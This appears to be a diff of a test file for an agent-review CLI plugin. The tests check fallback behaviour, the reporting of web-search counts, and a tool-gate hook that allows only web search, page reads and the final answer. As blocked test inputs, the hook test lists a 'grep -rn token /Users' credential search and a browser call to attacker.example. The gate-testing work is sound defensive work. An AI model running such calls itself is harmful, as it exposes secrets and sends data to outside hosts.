@@ -8,8 +8,8 @@ import {
   setRunReviewForTest,
   PRIMARY_REVIEW_MODEL,
   FALLBACK_REVIEW_MODEL,
-  GATED_TOOLS,
-  REVIEW_GATED_TOOLS
+  ASK_TOOLS,
+  REVIEW_TOOLS
 } from "../scripts/gemini-companion.mjs";
 import {
   ConfigError,
@@ -17,7 +17,8 @@ import {
   AgyConnectionError,
   AgyModelError,
   AgyQuotaError,
-  AgyTimeoutError
+  AgyTimeoutError,
+  AgyInterruptedError
 } from "../scripts/lib/errors.mjs";
 
 function captureStdout(fn) {
@@ -332,6 +333,29 @@ for (const [name, makeErr] of [
   });
 }
 
+test("--no-fallback stops after the first failure, and an interrupted run never falls back", async () => {
+  for (const [argv, err] of [
+    [["--no-fallback"], new AgyQuotaError('agy has no quota left for "gemini-4-argon-high": RESOURCE_EXHAUSTED')],
+    [[], new AgyInterruptedError("Stopped by SIGTERM.")]
+  ]) {
+    const calls = [];
+    setRunReviewForTest(async (args) => {
+      calls.push(args.model);
+      throw err;
+    });
+    await assert.rejects(() => handleReview(argv, { stdin: "a claim to check" }), (e) => e === err);
+    assert.deepEqual(calls, [PRIMARY_REVIEW_MODEL], err.name);
+  }
+});
+
+test("the footer counts the web searches agy ran, and --json has them", async () => {
+  setRunReviewForTest(async () => ({ ...okPayload, searches: { attempted: 3, succeeded: 2 } }));
+  const out = await captureStdout(() => handleReview([], { stdin: "claim body" }));
+  assert.match(out, /\[grounding\] 3 web searches run, 2 succeeded\. 2 source URLs cited\./);
+  const json = JSON.parse(await captureStdout(() => handleReview(["--json"], { stdin: "claim body" })));
+  assert.deepEqual(json.searches, { attempted: 3, succeeded: 2 });
+});
+
 test("a sign-in error is not retried on Flash", async () => {
   const calls = [];
   setRunReviewForTest(async (args) => {
@@ -544,32 +568,25 @@ test("the run gets the whole --timeout-ms budget", async () => {
   assert.deepEqual(timeouts, [600000]);
 });
 
-test("review runs agy with a hook that denies every command, subagent and page read", async () => {
+test("review runs agy with a hook that allows only web search, page reads and the schema answer", async () => {
   let cwd;
   setRunReviewForTest(async (args) => {
     cwd = args.cwd;
     // Run the hook the way agy does, from the hooks.json in the temp folder.
     const hooks = JSON.parse(fs.readFileSync(path.join(cwd, ".agents", "hooks.json"), "utf8"));
-    const [group] = hooks["gemini-plugin-command-gate"].PreToolUse;
-    assert.equal(group.matcher, REVIEW_GATED_TOOLS);
-    // A review needs only web search: page reads leave with the rest.
-    for (const tool of ["run_command", "invoke_subagent", "schedule", "read_url_content", "open_browser_url"]) {
-      assert.match(tool, new RegExp(group.matcher), tool);
-    }
-    for (const tool of ["search_web", "finish"]) {
-      assert.doesNotMatch(tool, new RegExp(group.matcher), tool);
-    }
+    const [group] = hooks["gemini-plugin-tool-gate"].PreToolUse;
+    assert.equal(group.matcher, "*");
+    const decide = (toolCall) =>
+      JSON.parse(execFileSync("sh", ["-c", group.hooks[0].command], { input: JSON.stringify({ toolCall }), encoding: "utf8" })).decision;
+    for (const name of ["search_web", "read_url_content", "finish"]) assert.equal(decide({ name, args: {} }), "allow", name);
     const calls = [
       { name: "run_command", args: { CommandLine: "ls /tmp" } },
       { name: "run_command", args: { CommandLine: "grep -rn token /Users" } },
-      { name: "invoke_subagent", args: { Prompt: "x" } },
-      { name: "read_url_content", args: { Url: "https://attacker.example/?q=claim" } },
-      { name: "open_browser_url", args: { Url: "https://attacker.example/" } }
+      { name: "invoke_subagent", args: { Prompt: "x", TypeName: "image-generator" } },
+      { name: "open_browser_url", args: { Url: "https://attacker.example/" } },
+      { name: "read_file", args: { Path: path.join(cwd, "files") } }
     ];
-    for (const toolCall of calls) {
-      const out = execFileSync("sh", ["-c", group.hooks[0].command], { input: JSON.stringify({ toolCall }), encoding: "utf8" });
-      assert.equal(JSON.parse(out).decision, "deny", toolCall.name);
-    }
+    for (const toolCall of calls) assert.equal(decide(toolCall), "deny", toolCall.name);
     return okPayload;
   });
   const out = await captureStdout(() => handleReview(["--json"], { stdin: "claim body" }));
@@ -577,13 +594,13 @@ test("review runs agy with a hook that denies every command, subagent and page r
     { action: "command", display_name: "ls /tmp" },
     { action: "command", display_name: "grep -rn token /Users" },
     { action: "invoke_subagent" },
-    { action: "read_url_content" },
-    { action: "open_browser_url" }
+    { action: "open_browser_url" },
+    { action: "read_file" }
   ]);
   assert.equal(fs.existsSync(cwd), false, "the temp folder is removed");
-  // Ask keeps its page reads.
-  assert.doesNotMatch("read_url_content", new RegExp(GATED_TOOLS));
-  assert.doesNotMatch("open_browser_url", new RegExp(GATED_TOOLS));
+  // A review and an ask both open pages; only an ask reads files.
+  assert.deepEqual(REVIEW_TOOLS, ["search_web", "read_url_content", "finish"]);
+  assert.ok(ASK_TOOLS.includes("read_url_content"));
 });
 
 test("review refuses --cwd, which would skip the gated temp folder, without calling agy", async () => {
@@ -604,7 +621,7 @@ test("focus text after -- is focus text, also when it starts with --cwd=, and th
   setRunReviewForTest(async (args) => {
     seen = args;
     const hooks = JSON.parse(fs.readFileSync(path.join(args.cwd, ".agents", "hooks.json"), "utf8"));
-    assert.equal(hooks["gemini-plugin-command-gate"].PreToolUse[0].matcher, REVIEW_GATED_TOOLS);
+    assert.equal(hooks["gemini-plugin-tool-gate"].PreToolUse[0].matcher, "*");
     return okPayload;
   });
   await captureStdout(() => handleReview(["--json", "--", "--cwd=/tmp check dates"], { stdin: "claim body" }));
